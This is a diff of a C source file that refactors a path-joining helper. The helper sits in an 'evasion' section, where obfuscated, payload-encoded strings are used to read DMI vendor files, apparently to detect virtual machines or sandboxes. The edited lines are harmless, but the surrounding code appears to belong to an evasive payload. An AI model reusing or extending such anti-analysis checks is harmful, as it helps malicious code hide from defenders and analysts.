@@ -34,7 +34,7 @@ char* decodeMacro(char *macroEncoded, int *payloadEncoderID);
 int parseInt(char *string, int fallback);
 int verifyDir(char *dirPath);
 int fileHas(char *filePath, char *content);
-char *joinPath(char *basePath, ...);
+char *joinPath(char *args[]);
 
 // funcs defs
 // evasion
@@ -186,9 +186,9 @@ int checkDmiID(int *payloadEncoderID) {
     char *_tmp_chassisVendor = decodeMacro(SCDI_CHASSIS_VENDOR, payloadEncoderID);
 
     char *paths[] = {
-        joinPath(basePath, _tmp_sysVendor, NULL),
-        joinPath(basePath, _tmp_biosVendor, NULL),
-        joinPath(basePath, _tmp_chassisVendor, NULL),
+        joinPath((char*[]){basePath, _tmp_sysVendor, NULL}),
+        joinPath((char*[]){basePath, _tmp_biosVendor, NULL}),
+        joinPath((char*[]){basePath, _tmp_chassisVendor, NULL}),
 
     };
 
@@ -1099,50 +1099,32 @@ int fileHas(char *filePath, char *content) {
 Reads all args untill null and path.join it
 
 */
-char *joinPath(char *basePath, ...) {
-    va_list args;
-
-    char format[4096];
-    char output[4096];
-    format[0] = '\0';
-    output[0] = '\0';
-
-    va_start(args, basePath);
-    
-    for (;;) {
-        char *arg = va_arg(args, char*);
-        if (arg == NULL) {
-            break;
-
-        }
-
+char *joinPath(char *args[]) {
+    char buf[4096];
+    size_t len = 0;
+    for (int i = 0; args[i] != NULL; i++) {
+        char *arg = args[i];
         if (strlen(arg) > 253) {
             return NULL;
 
         }
 
-        if (strstr(arg, " ")) {
-            strcat(format, "/\"%s\"");
-
-        } else {
-            strcat(format, "/%s");
+        if (len + strlen(arg) + 4 >= sizeof(buf)) {
+            return NULL;
 
         }
 
+        len += snprintf(buf + len, sizeof(buf) - len, i != 0 ? strstr(arg, " ") ? "/\"%s\"" : "/%s" : strstr(arg, " ") ? "\"%s\"" : "%s", arg);
+        
     }
 
-    va_end(args);
-    va_start(args, basePath);
-    vsprintf(output, format, args);
-    va_end(args);
-
-    char *result = malloc(strlen(output) + 1);
-    if (!result) {
+    char *result = malloc(len + 1);
+    if (result == NULL) {
         return NULL;
-    
+
     }
 
-    strcpy(result, output);
+    strcpy(result, buf);
     return result;
 
 };
